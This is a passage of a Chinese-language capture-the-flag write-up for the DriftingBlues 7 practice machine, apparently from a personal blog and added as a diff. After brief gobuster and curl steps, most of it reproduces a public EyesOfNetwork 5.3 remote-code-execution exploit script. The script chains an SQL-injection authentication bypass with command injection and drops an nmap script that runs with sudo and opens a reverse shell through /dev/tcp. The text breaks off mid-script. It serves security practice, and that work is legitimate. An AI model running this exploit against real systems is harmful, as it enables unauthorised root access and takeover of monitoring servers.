@@ -1,0 +1,368 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>DriftingBlues 7 | 1ux4ry Archive</title><meta name=description content="一些打过的靶机"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label="DriftingBlues  7"><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./靶机</p><div class=article-hero-card__title><span class=article-hero-card__title-main>靶机</span>
+<span class=article-hero-card__title-sub>DriftingBlues 7</span></div><p class=article-hero-card__meta>靶机 / 靶机 / 1ux4ry Archive</p><p class=article-hero-card__desc>一些打过的靶机</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>靶机</p><h1>DriftingBlues 7</h1><div class=single-meta><span>2026-06-15</span>
+<span>靶机</span>
+<span># 靶机</span></div></header><div class="page-copy content-body"><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227224220356.png alt=image.png loading=lazy decoding=async></figure></p><p>访问web页面 没什么东西 是一个 cms</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227224308445.png alt=image.png loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gobuster dir -u http://61.139.2.144:66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.sh
+</span></span></code></pre></div><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227232520662.png alt=image.png loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://61.139.2.144:66/flag.txt
+</span></span></code></pre></div><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227231906385.png alt=image.png loading=lazy decoding=async></figure></p><p>接下来主要是从80或者443端口入手，扎到CMS的版本，以及相应的漏洞利用脚本：</p><p>查询EyesOfNetwork 5.1 to 5.3 exploits：</p><p><a href=https://github.com/h4knet/eonrce>https://github.com/h4knet/eonrce</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># coding: utf8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Exploit Title: EyesOfNetwork 5.3 RCE</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Date: 02/2020</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Clément Billac - Twitter: @h4knet</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://www.eyesofnetwork.com/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Version: 5.3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2020-8654, CVE-2020-8655, CVE-2020-8656</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#                 We were able to run the &#39;id&#39; command with the following payload in the target field : &#39;;id #&#39;.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># CVE-2020-8655 - LPE via nmap NSE script</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#                 As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#                 nmap version 6.40 is used and doesn&#39;t have the -c and -e options.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># CVE-2020-8656 - SQLi in API in getApiKey function on &#39;username&#39; field</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#                 PoC: /eonapi/getApiKey?username=&#39; union select sleep(3),0,0,0,0,0,0,0 or &#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#                 Auth bypass: /eonapi/getApiKey?&amp;username=&#39; union select 1,&#39;admin&#39;,&#39;1c85d47ff80b5ff2a4dd577e8e5f8e9d&#39;,0,0,1,1,8 or &#39;&amp;password=h4knet</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Changelog</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># v1.0 - 02/2020 - Initial release</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># v1.1 - 03/2020 - Add parameters output; banner update</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Python imports</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>json</span><span class=o>,</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>argparse</span><span class=o>,</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Text colors</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_yellow</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[01;33m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_blue</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[01;34m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_red</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[01;31m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_green</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[01;32m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_bold</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[01;01m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_reset</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[00m&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_info</span> <span class=o>=</span> <span class=n>txt_blue</span> <span class=o>+</span> <span class=s2>&#34;[*] &#34;</span> <span class=o>+</span> <span class=n>txt_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_success</span> <span class=o>=</span> <span class=n>txt_green</span> <span class=o>+</span> <span class=s2>&#34;[+] &#34;</span> <span class=o>+</span> <span class=n>txt_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_warn</span> <span class=o>=</span> <span class=n>txt_yellow</span> <span class=o>+</span> <span class=s2>&#34;[!] &#34;</span> <span class=o>+</span> <span class=n>txt_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>txt_err</span> <span class=o>=</span> <span class=n>txt_red</span> <span class=o>+</span> <span class=s2>&#34;[x] &#34;</span> <span class=o>+</span> <span class=n>txt_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Banner</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>banner</span> <span class=o>=</span> <span class=p>(</span><span class=n>txt_bold</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>+-----------------------------------------------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| EyesOfNetwork 5.3 RCE                                                       |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| 03/2020 - v1.1 - Clément Billac </span><span class=se>\033</span><span class=s2>[01;34mTwitter: @h4knet</span><span class=se>\033</span><span class=s2>[00m                            |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>|                                                                             |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| Examples:                                                                   |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| eonrce.py -h                                                                |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| eonrce.py http(s)://EyesOfNetwork-URL                                       |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>+-----------------------------------------------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span> <span class=o>+</span> <span class=n>txt_reset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Arguments Parser</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=s2>&#34;eonrce&#34;</span><span class=p>,</span> <span class=n>formatter_class</span><span class=o>=</span><span class=n>argparse</span><span class=o>.</span><span class=n>RawDescriptionHelpFormatter</span><span class=p>,</span> <span class=n>usage</span><span class=o>=</span><span class=n>banner</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;URL&#34;</span><span class=p>,</span> <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;URL&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;URL of the EyesOfNetwork server&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;-ip&#34;</span><span class=p>,</span> <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;IP&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Local IP to receive reverse shell&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>gethostbyname</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>gethostname</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;-port&#34;</span><span class=p>,</span> <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;Port&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Local port to listen&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>443</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;-user&#34;</span><span class=p>,</span> <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;Username&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Name of the new user to create&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s1>&#39;h4ker&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;-password&#34;</span><span class=p>,</span> <span class=n>metavar</span><span class=o>=</span><span class=s2>&#34;Password&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Password of the new user&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s1>&#39;net_was_here&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># HTTP Requests config</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>packages</span><span class=o>.</span><span class=n>urllib3</span><span class=o>.</span><span class=n>disable_warnings</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>baseurl</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>useragent</span> <span class=o>=</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 1.0; WOW64; rv:13.37) Gecko/20200104 Firefox/13.37&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Admin user creation variables</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>new_user</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>user</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>new_pass</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>password</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Executed command</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The following payload performs both the LPE and the reverse shell in a single command.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Readable PoC: ;echo &#34;local os = require \&#34;os\&#34; hostrule=function(host) os.execute(\&#34;/bin/sh -i &gt;&amp; /dev/tcp/192.168.30.112/8081 0&gt;&amp;1\&#34;) end action=function() end&#34; &gt; /tmp/h4k;sudo /usr/bin/nmap localhost -p 1337 -script /tmp/h4k #</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>ip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;%3Becho+</span><span class=si>%22lo</span><span class=s1>cal+os+%3D+require+%5C</span><span class=si>%22o</span><span class=s1>s%5C%22+hostrule%3Dfunction</span><span class=si>%28ho</span><span class=s1>st%29+os.execute</span><span class=si>%28%</span><span class=s1>5C</span><span class=si>%22%</span><span class=s1>2Fbin</span><span class=si>%2F</span><span class=s1>sh+-i+</span><span class=si>%3E</span><span class=s1>%26+</span><span class=si>%2F</span><span class=s1>dev</span><span class=si>%2F</span><span class=s1>tcp</span><span class=si>%2F</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>ip</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=si>%2F</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>port</span> <span class=o>+</span> <span class=s1>&#39;+0</span><span class=si>%3E%261%</span><span class=s1>5C</span><span class=si>%22%</span><span class=s1>29+end+action%3Dfunction</span><span class=si>%28%</span><span class=s1>29+end%22+</span><span class=si>%3E</span><span class=s1>+</span><span class=si>%2F</span><span class=s1>tmp</span><span class=si>%2F</span><span class=s1>h4k%3Bsudo+</span><span class=si>%2F</span><span class=s1>usr</span><span class=si>%2F</span><span class=s1>bin</span><span class=si>%2F</span><span class=s1>nmap+localhost+-p+1337+-script+</span><span class=si>%2F</span><span class=s1>tmp</span><span class=si>%2F</span><span class=s1>h4k+%23&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Exploit banner</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=p>(</span><span class=n>txt_bold</span><span class=p>,</span><span class=s2>&#34;&#34;&#34;+-----------------------------------------------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| EyesOfNetwork 5.3 RCE                                                       |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>| 03/2020 - v1.1 - Clément Billac - </span><span class=se>\033</span><span class=s2>[01;34mTwitter: @h4knet</span><span class=se>\033</span><span class=s2>[00m                          |
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>+-----------------------------------------------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Reverse shell info output</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s2>&#34;Reverse shell: &#34;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>ip</span><span class=p>,</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s2>&#34;User to create: &#34;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>new_user</span><span class=p>,</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=n>new_pass</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Check if it&#39;s a EyesOfNetwork login page.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>baseurl</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;&lt;title&gt;EyesOfNetwork&lt;/title&gt;&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=ow>and</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;form action=&#34;login.php&#34; method=&#34;POST&#34;&gt;&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s2>&#34;EyesOfNetwork login page found&#34;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;EyesOfNetwork login page not found&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Check for accessible EON API</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span> <span class=o>+</span> <span class=s1>&#39;/eonapi/getApiKey&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>401</span> <span class=ow>and</span> <span class=s1>&#39;api_version&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>keys</span><span class=p>()</span> <span class=ow>and</span> <span class=s1>&#39;http_code&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s1>&#39;EyesOfNetwork API page found. API version: &#39;</span><span class=p>,</span><span class=n>txt_bold</span> <span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;api_version&#39;</span><span class=p>],</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_warn</span><span class=p>,</span> <span class=s1>&#39;EyesOfNetwork API page not found&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># SQL injection with authentication bypass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span> <span class=o>+</span> <span class=s1>&#39;/eonapi/getApiKey?&amp;username=</span><span class=si>%27%</span><span class=s1>20union</span><span class=si>%20s</span><span class=s1>elect%201,</span><span class=si>%27a</span><span class=s1>dmin%27,</span><span class=si>%271c</span><span class=s1>85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8</span><span class=si>%20o</span><span class=s1>r</span><span class=si>%20%</span><span class=s1>27&amp;password=h4knet&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s1>&#39;EONAPI_KEY&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_success</span><span class=p>,</span> <span class=s1>&#39;Admin user key obtained: &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;EONAPI_KEY&#39;</span><span class=p>],</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
